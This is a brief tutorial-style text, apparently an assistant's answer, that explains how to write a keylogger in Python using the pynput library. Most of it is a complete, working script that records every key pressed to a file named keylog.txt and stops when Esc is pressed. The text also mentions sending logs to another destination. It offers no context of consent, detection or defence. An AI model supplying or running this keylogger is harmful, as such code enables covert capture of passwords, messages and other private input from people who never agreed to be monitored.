Writing a keylogger in Python involves using libraries that can capture keyboard events and log them to a file or send them to a specified destination. One popular library for this purpose is pynput.

Here's a basic example of a keylogger using pynput:

python

from pynput.keyboard import Key, Listener

log_file = 'keylog.txt'

def on_press(key):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


This script will log all keyboard events to a file named keylog.txt and stop when the Esc key is pressed.
